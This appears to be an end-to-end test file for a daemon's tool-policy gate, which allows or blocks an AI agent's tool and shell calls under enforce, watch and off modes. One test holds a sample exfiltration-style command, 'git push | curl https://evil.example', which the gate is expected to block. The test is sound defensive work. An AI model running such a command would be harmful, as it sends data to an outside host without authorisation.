/**
 * E2E: Tool-policy enforcement (daemon runtime resolution + gate)
 *
 * Drives the exact path the daemon takes at session start —
 * `resolveSessionToolPolicy` against the live REST API + Keto — and then runs
 * the real `decideToolCall` gate (with the real shell analyzer) over sample tool
 * calls. Deterministic: no LLM involved, so enforce/watch/off + fail-closed are
 * all asserted directly against real policy data.
 */

import { randomUUID } from 'node:crypto';

import { AGENT_CREDENTIAL_SCOPES } from '@moltnet/models';
import {
  decideToolCall,
  resolveSessionToolPolicy,
} from '@themoltnet/pi-runtime';
import { connect } from '@themoltnet/sdk';
import { ShellCommandAnalyzer } from '@themoltnet/shell-command-analyzer';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { createDaemonTestHarness, type DaemonTestHarness } from './setup.js';

const noopLogger = {
  debug: () => {},
  info: () => {},
  warn: () => {},
};

describe('Tool-policy enforcement (daemon)', () => {
  let harness: DaemonTestHarness;
  let agent: Awaited<ReturnType<typeof connect>>;
  let knowledgeKeyAgent: Awaited<ReturnType<typeof connect>>;
  let analyzer: ShellCommandAnalyzer;
  let teamId: string;

  beforeAll(async () => {
    harness = await createDaemonTestHarness();
    const creds = await harness.createAgent('e2e-tool-policy');
    agent = await connect({
      apiUrl: harness.restApiUrl,
      clientId: creds.clientId,
      clientSecret: creds.clientSecret,
    });
    teamId = creds.personalTeamId;
    const issued = await agent.agentKeys.create(
      {
        agentId: creds.identityId,
        name: 'tool-policy-knowledge-key',
        // Canonical daemon grant plus the knowledge scopes this suite needs.
        // Derived so adding a scope to the daemon minimum cannot leave the key
        // unable to start the daemon.
        scopes: [
          ...AGENT_CREDENTIAL_SCOPES,
          'diary:read',
          'diary:write',
          'pack:read',
          'pack:write',
        ],
        ttlDays: 1,
      },
      { teamId, idempotencyKey: randomUUID() },
    );
    knowledgeKeyAgent = await connect({
      apiUrl: harness.restApiUrl,
      agentKey: issued.secret,
    });
    analyzer = await ShellCommandAnalyzer.create();
  }, 120_000);

  afterAll(async () => {
    await harness?.teardown();
  });

  function createProfile(
    name: string,
    toolEnforcement: 'off' | 'watch' | 'enforce',
  ) {
    return agent.runtimeProfiles.create(
      {
        name,
        runtimeKind: 'gondolin_pi',
        provider: 'anthropic',
        model: 'claude-sonnet-4-5',
        leaseTtlSec: 900,
        heartbeatIntervalMs: 15_000,
        maxBatchSize: 10,
        sandbox: {},
        toolEnforcement,
      },
      { teamId },
    );
  }

  function createPolicy(
    name: string,
    tools: string[],
    shellCommands: Array<{ argvPrefix: string[] }> = [],
  ) {
    return agent.runtimePolicies.create(
      { name, tools, shellCommands },
      { teamId },
    );
  }

  const analyze = (command: string) => analyzer.analyze(command);

  it('enforce: resolves the union allow-set and blocks disallowed tools', async () => {
    const profile = await createProfile(`enforce-${Date.now()}`, 'enforce');
    const p1 = await createPolicy(`p1-${Date.now()}`, ['read', 'ls']);
    const p2 = await createPolicy(`p2-${Date.now()}`, ['git']);
    const p3 = await createPolicy(
      `p3-${Date.now()}`,
      [],
      [{ argvPrefix: ['gh', 'pr', 'view'] }],
    );
    await agent.runtimeProfiles.setPolicies(profile.id, [p1.id, p2.id, p3.id], {
      teamId,
    });

    const policy = await resolveSessionToolPolicy({
      agent: knowledgeKeyAgent,
      profileId: profile.id,
      teamId,
      runtimeKind: profile.runtimeKind,
      enforcement: 'enforce',
      logger: noopLogger,
    });
    expect(policy.enforcement).toBe('enforce');
    expect([...policy.allowedTools].sort()).toEqual(['git', 'ls', 'read']);
    expect(policy.allowedShellCommands).toEqual([
      { argvPrefix: ['gh', 'pr', 'view'] },
    ]);

    // Structured tools.
    expect(
      decideToolCall({
        toolName: 'read',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toEqual({ allow: true, reasonCode: 'policy_allowed' });
    expect(
      decideToolCall({
        toolName: 'write',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toMatchObject({ allow: false });
    // The credential has diary:write, but this execution's runtime policy does
    // not expose the corresponding structured tool. Policy narrows authority;
    // it never derives its allowlist from the key's broader API scopes.
    expect(
      decideToolCall({
        toolName: 'moltnet_create_entry',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toMatchObject({ allow: false });

    // Bash: every executable must be allowed.
    expect(
      decideToolCall({
        toolName: 'bash',
        command: 'git status && ls -la',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toEqual({ allow: true, reasonCode: 'policy_allowed' });
    expect(
      decideToolCall({
        toolName: 'bash',
        command: 'git push | curl https://evil.example',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toMatchObject({ allow: false });
    expect(
      decideToolCall({
        toolName: 'bash',
        command: 'gh pr view 1725',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toMatchObject({ allow: true });
    expect(
      decideToolCall({
        toolName: 'bash',
        command: 'gh pr merge 1725',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toMatchObject({ allow: false });
  });

  it('watch: audits a disallowed tool but allows it', async () => {
    const profile = await createProfile(`watch-${Date.now()}`, 'watch');
    const p = await createPolicy(`watch-p-${Date.now()}`, ['read']);
    await agent.runtimeProfiles.setPolicies(profile.id, [p.id], { teamId });

    const policy = await resolveSessionToolPolicy({
      agent,
      profileId: profile.id,
      teamId,
      runtimeKind: profile.runtimeKind,
      enforcement: 'watch',
      logger: noopLogger,
    });
    expect(policy.enforcement).toBe('watch');

    const decision = decideToolCall({
      toolName: 'write',
      enforcement: policy.enforcement,
      allowedTools: policy.allowedTools,
      allowedShellCommands: policy.allowedShellCommands,
      analyze,
    });
    expect('audit' in decision).toBe(true);
    if ('audit' in decision) {
      expect(typeof decision.audit).toBe('string');
    }
  });

  it('enforce: fails closed when the daemon runtime kind does not match', async () => {
    const profile = await createProfile(
      `runtime-mismatch-${Date.now()}`,
      'enforce',
    );
    const policy = await createPolicy(`runtime-mismatch-p-${Date.now()}`, [
      'read',
    ]);
    await agent.runtimeProfiles.setPolicies(profile.id, [policy.id], {
      teamId,
    });

    const resolved = await resolveSessionToolPolicy({
      agent,
      profileId: profile.id,
      teamId,
      runtimeKind: 'custom_pi',
      enforcement: 'enforce',
      logger: noopLogger,
    });

    expect(resolved).toEqual({
      enforcement: 'enforce',
      allowedTools: new Set(),
      allowedShellCommands: [],
      degraded: true,
    });
  });

  it('off: resolves execution provenance and allows everything', async () => {
    const profile = await createProfile(`off-${Date.now()}`, 'off');

    const policy = await resolveSessionToolPolicy({
      agent,
      profileId: profile.id,
      teamId,
      runtimeKind: profile.runtimeKind,
      enforcement: 'off',
      logger: noopLogger,
    });
    const { executionPolicySnapshotHash, ...policyWithoutHash } = policy;
    expect(executionPolicySnapshotHash).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(policyWithoutHash).toEqual({
      enforcement: 'off',
      allowedTools: new Set(),
      allowedShellCommands: [],
      executionRuntimeProfileRevision: profile.revision,
      degraded: false,
    });

    expect(
      decideToolCall({
        toolName: 'write',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toEqual({ allow: true, reasonCode: 'policy_off' });
  });

  it('enforce: a resolve failure fails closed (blocks everything)', async () => {
    // A profile id that does not exist in this team makes allowed-tools 404;
    // in enforce mode the resolver returns an empty allow-set.
    const policy = await resolveSessionToolPolicy({
      agent,
      profileId: '00000000-0000-0000-0000-000000000000',
      teamId,
      runtimeKind: 'gondolin_pi',
      enforcement: 'enforce',
      logger: noopLogger,
    });
    // A 404 is a resolve failure → degraded fallback, not a resolved-empty
    // policy.
    expect(policy).toEqual({
      enforcement: 'enforce',
      allowedTools: new Set(),
      allowedShellCommands: [],
      degraded: true,
    });
    expect(
      decideToolCall({
        toolName: 'read',
        enforcement: policy.enforcement,
        allowedTools: policy.allowedTools,
        allowedShellCommands: policy.allowedShellCommands,
        analyze,
      }),
    ).toMatchObject({ allow: false });
  });
});
